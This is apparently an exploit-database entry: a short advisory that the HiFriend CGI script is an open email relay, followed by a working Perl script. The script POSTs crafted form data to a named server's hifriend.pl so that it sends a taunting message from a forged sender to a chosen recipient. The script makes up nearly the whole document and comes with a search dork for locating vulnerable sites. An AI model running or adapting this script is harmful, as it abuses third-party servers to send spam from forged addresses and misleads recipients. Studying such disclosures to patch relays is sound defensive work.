source: http://www.securityfocus.com/bid/30320/info

HiFriend is prone to an open-email-relay vulnerability.

An attacker could exploit this issue by constructing a script that would send unsolicited bulk email to an unrestricted amount of email addresses with a forged email address.

#!/usr/bin/perl
=pod
----------------------------
------Header Injection------
----------------------------

Script: hifriend.pl
Vendor: Hibyte Software
Version: The free one you get from many webpages
Dork: "hifriend.pl" + "cgi-bin"

Found & coded by Perforin

www.DarK-CodeZ.com
www.vx.perforin.de.vu


Greetz to: SkyOut,Sph1nX,zer0day,Rayden,Neo2k8,Cactus,MereX and all my Friends out there!
=cut

use strict;
use warnings;
use IO::Socket::INET;


my($MSG,$lngt,$data,$sock,$add,%config);

# Here%GŽ%@s your Message

$MSG = <<"TXT";
arf arf arf 
We gotcha!

Visit http://DarK-CodeZ.com

German VX Community

TXT

# No im not making a friendly Code where you just have to start and type your shit in.
# Use brain.exe to fill in the stuff you need.

%config = (
Server => "sweetscents.com",
Path => "/cgi-bin/",
From => "admin".chr(64)."freehostia.com",
To => "Luxpower".chr(64)."web.de",
Name => "Perforin",
MSG => "$MSG"
);


$sock = new IO::Socket::INET(PeerAddr => $config{'Server'},
                                PeerPort => 80,
                                Proto => 'tcp',
                                Timeout => 1) || die("[+] Could not connect!\n");
								

$data = 'refpage=&reftitle=&Friends='.$config{'To'}.'&SenderName='.$config{'Name'}.'&From='.$config{'From'}.'&PersonalMsg='.$config{'MSG'};

$lngt = length($data);

print $sock "POST $config{'Path'}hifriend.pl?sp=y HTTP/1.1\n";
print $sock "Host: $config{'Server'}\n";
print $sock "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12\n";
print $sock "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n";
print $sock "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\n";
print $sock "Accept-Encoding: gzip,deflate\n";
print $sock "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n";
print $sock "Keep-Alive: 300\n";
print $sock "Connection: keep-alive\n";
print $sock "Referer: $config{'Server'}/cgi-bin/hifriend.pl\n";
print $sock "Accept-Language: en-us\n";
print $sock "Content-Type: application/x-www-form-urlencoded\n";
print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7. Gecko/20070421 Firefox/2.0.0\n";
print $sock "Content-Length: $lngt\n\n";
print $sock "$data\n";

print "[+] Done!";
